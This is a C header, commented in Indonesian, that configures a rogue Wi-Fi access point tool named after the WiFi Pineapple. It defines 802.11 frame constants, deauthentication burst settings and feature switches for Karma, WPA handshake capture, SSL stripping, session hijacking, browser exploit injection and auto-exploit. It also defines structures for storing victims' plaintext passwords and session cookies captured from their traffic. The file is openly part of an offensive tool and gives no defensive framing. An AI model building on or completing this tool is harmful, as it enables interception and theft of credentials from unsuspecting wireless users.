/*
 * ============================================================================
 * HEADER     : config.h
 * MODUL      : Konfigurasi Sentral & Definisi Protokol IEEE 802.11
 * DESKRIPSI  : Pusat seluruh konstanta, opcode biner, struktur data frame,
 *              dan konfigurasi global Rogue AP WiFi Pineapple.
 * ============================================================================
 */

#ifndef CONFIG_H
#define CONFIG_H

// --- 1. Header Standar C untuk Tipe Data Presisi ---
#include <stdint.h>  // uint8_t, uint16_t, uint32_t (Jaminan presisi ukuran bit di semua CPU)
#include <stdbool.h> // bool, true, false (Tipe boolean standar C99)
#include <time.h>    // time_t (Stempel waktu epoch untuk logging client & credential)

// --- 2. Tipe Frame Utama 802.11 (Bit 2-3 pada Frame Control) ---
#define IEEE80211_FTYPE_MGMT       0x00 // Management Frame (Beacon, Probe, Auth, Deauth)
#define IEEE80211_FTYPE_CTRL       0x01 // Control Frame (RTS, CTS, ACK)
#define IEEE80211_FTYPE_DATA       0x02 // Data Frame (IP / TCP / UDP payload)

// --- 3. Subtipe Management Frame (Bit 4-7 pada Byte 0 Frame Control) ---
#define IEEE80211_STYPE_ASSOC_REQ  0x00 // Association Request (Client minta bergabung)
#define IEEE80211_STYPE_ASSOC_RESP 0x01 // Association Response (AP menerima/menolak)
#define IEEE80211_STYPE_PROBE_REQ  0x04 // Probe Request (Client mencari SSID)
#define IEEE80211_STYPE_PROBE_RESP 0x05 // Probe Response (AP mengumumkan keberadaannya)
#define IEEE80211_STYPE_BEACON     0x08 // Beacon Frame (Siaran berkala keberadaan AP)
#define IEEE80211_STYPE_AUTH       0x0B // Authentication Request / Response
#define IEEE80211_STYPE_DEAUTH     0x0C // Deauthentication (Pemutus koneksi paksa)

// --- 4. Opcode Frame Control 16-bit (Format Network Byte Order) ---
// Nilai ini siap dibungkus htons() saat perakitan atau dicocokkan dengan ntohs() saat sniffing
#define IEEE80211_FC_BEACON         0x8000 // Subtype 8 (1000b) -> 0x8000
#define IEEE80211_FC_PROBE_RESP     0x5000 // Subtype 5 (0101b) -> 0x5000
#define IEEE80211_FC_AUTH           0xB000 // Subtype 11 (1011b) -> 0xB000
#define IEEE80211_FC_DEAUTH         0xC000 // Subtype 12 (1100b) -> 0xC000
#define IEEE80211_FC_ASSOC_RESP     0x1000 // Subtype 1 (0001b) -> 0x1000

// --- 5. Status & Reason Codes Standar Wi-Fi ---
#define WLAN_AUTH_OPEN              0      // Algoritma Open System Authentication (tanpa kunci)
#define WLAN_STATUS_SUCCESS         0      // Status berhasil pada respon handshake
#define REASON_CLASS3_FRAME         7      // Deauth Reason 7: "Class 3 frame received from nonassociated STA"

// --- 6. Tag Information Element (IE) Standar IEEE 802.11 ---
#define IE_TAG_SSID                 0      // Tag 0 : Nama jaringan (SSID)
#define IE_TAG_RATES                1      // Tag 1 : Kecepatan transfer data yang didukung
#define IE_TAG_DS_PARAM             3      // Tag 3 : Kanal frekuensi radio (Channel 1-14)
#define IE_TAG_EXTENDED_RATES       50     // Tag 50: Extended Supported Rates (802.11g)

// --- 7. Batasan Kapasitas Buffer & Konfigurasi Sistem ---
#define BEACON_INTERVAL             100    // Interval siaran beacon standar = 100 ms (10 Hz)
#define MAX_SSID_LEN                32     // Panjang maksimal nama SSID standar IEEE 802.11
#define MAX_CLIENTS                 256    // Kapasitas maksimum database client korban
#define MAX_CREDENTIALS             1024   // Kapasitas maksimum penyimpanan password tertangkap
#define MAX_COOKIES                 1024   // Kapasitas maksimum penyimpanan cookie session hijack
#define MAX_HANDSHAKES              256    // Kapasitas maksimum capture 4-Way Handshake WPA
#define MAX_TARGETS                 32     // Kapasitas modul multi-target
#define MAX_MODULES                 32     // Kapasitas plugin modul dinamis
#define MAX_FILTER_RULES            64     // Kapasitas aturan filter lalu lintas
#define MAX_HOSTNAME_LEN            256    // Panjang nama domain HTTP/DNS maksimal
#define MAX_COOKIE_LEN              2048   // Panjang header HTTP Cookie maksimal

// --- 8. Struktur Data Protokol (Packed: Tanpa Padding Kompiler) ---

/*
 * Header MAC IEEE 802.11 (24 Bytes Tepat):
 * Wajib packed agar compiler tidak menambahkan byte padding di antara field.
 */
typedef struct {
    uint16_t frame_control; // 2 byte: Jenis frame, subtype, dan flags (ToDS/FromDS)
    uint16_t duration;      // 2 byte: Nilai Network Allocation Vector (NAV)
    uint8_t addr1[6];       // 6 byte: Receiver Address (RA) / Destination Address (DA)
    uint8_t addr2[6];       // 6 byte: Transmitter Address (TA) / Source Address (SA)
    uint8_t addr3[6];       // 6 byte: BSSID (Identitas Access Point)
    uint16_t seq_ctrl;      // 2 byte: Sequence number (12 bit) dan Fragment number (4 bit)
    uint8_t payload[];      // Fleksibel array: Menunjuk ke awal payload data atau IEs
} __attribute__((packed)) wifi_header_t;

/*
 * Struktur Information Element (IE) TLV: Tag - Length - Value
 */
typedef struct {
    uint8_t tag_id;         // 1 byte: ID Tag (misal 0 untuk SSID)
    uint8_t length;         // 1 byte: Panjang data tag
    uint8_t data[];         // Fleksibel array: Isi data spesifik tag
} __attribute__((packed)) ie_t;

// --- 9. Struktur Konfigurasi Master Rogue AP ---
typedef struct {
    uint8_t bssid[6];               // MAC address AP tiruan kita
    char ssid[MAX_SSID_LEN];        // Nama SSID default yang dipancarkan
    int channel;                    // Kanal frekuensi operasi (1 s/d 14)
    char monitor_iface[16];         // Nama interface monitor (misal "mon0")
    char ap_iface[16];              // Nama interface AP (misal "ap0")

    // Sakelar fitur (Flags)
    bool ap_running;                // Status operasional Rogue AP
    bool karma_enabled;             // Apakah serangan Karma aktif
    bool channel_hopping_enabled;   // Apakah rotasi frekuensi otomatis aktif
    bool auto_exploit_enabled;      // Apakah modul auto-exploit aktif
    bool handshake_capture_enabled; // Apakah perekam 4-Way Handshake aktif
    bool session_hijack_enabled;    // Apakah pembajak sesi cookie aktif
    bool ssl_strip_enabled;         // Apakah SSL Strip HTTP downgrade aktif
    bool browser_exploit_enabled;   // Apakah injeksi payload browser aktif
    bool advanced_mitm_enabled;     // Apakah filter MITM lanjutan aktif

    // Parameter numerik
    int channel_hop_interval_ms;    // Kecepatan perpindahan channel (ms)
    int beacon_interval_ms;         // Ritme transmisi beacon (ms)
    int deauth_reason;              // Kode alasan pemutusan frame deauth (default 7)
    int deauth_burst;               // Jumlah paket deauth per tembakan (default 5)
    int portal_port;                // Port web server captive portal (default 80)
    int proxy_port;                 // Port proxy transparan HTTP (default 8080)
} ap_config_t;

// --- 10. Struktur Data Database Client Terhubung ---
typedef struct {
    uint8_t mac[6];                 // Alamat MAC fisik perangkat client
    char ip[16];                    // Alamat IP yang dipinjamkan DHCP (misal "192.168.1.100")
    time_t first_seen;              // Stempel waktu pertama kali terdeteksi radar
    time_t last_seen;               // Stempel waktu paket terakhir yang tertangkap
    bool is_connected;              // Status koneksi saat ini ke AP kita
} client_t;

// --- 11. Struktur Data Kredensial Formulir Tertangkap ---
typedef struct {
    char username[128];             // Nama pengguna / email formulir login
    char password[128];             // Kata sandi formulir login (plaintext)
    char host[MAX_HOSTNAME_LEN];    // Nama domain target (misal "login.example.com")
    time_t timestamp;               // Stempel waktu penyadapan
} credential_t;

// --- 12. Struktur Data 4-Way Handshake WPA/WPA2 ---
typedef struct {
    uint8_t bssid[6];               // MAC Access Point target
    uint8_t client[6];              // MAC client yang melakukan koneksi
    uint8_t eapol[256];             // Raw data paket EAPOL (Frame autentikasi)
    int eapol_len;                  // Panjang byte paket EAPOL
    int msg_num;                    // Nomor pesan handshake (Pesan 1, 2, 3, atau 4)
    time_t timestamp;               // Stempel waktu penangkapan
} handshake_t;

// --- 13. Struktur Data Cookie Sesi Web Tertangkap ---
typedef struct {
    char name[128];                 // Nama cookie (misal "PHPSESSID" atau "session_token")
    char value[MAX_COOKIE_LEN];     // Nilai token rahasia cookie
    char domain[MAX_HOSTNAME_LEN];  // Domain tempat cookie berlaku
    time_t captured_at;             // Stempel waktu penyadapan
    bool secure;                    // Flag Secure cookie
    bool http_only;                 // Flag HttpOnly cookie
} session_cookie_t;

// --- 14. Struktur Aturan Filter MITM ---
typedef struct {
    char pattern[128];              // Pola string pencarian (misal "password=" atau ".exe")
    int type;                       // Jenis filter (0 = URL, 1 = Body, 2 = Header)
    bool block;                     // Aksi: true = drop/blokir paket, false = catat saja
} filter_rule_t;

#endif // CONFIG_H
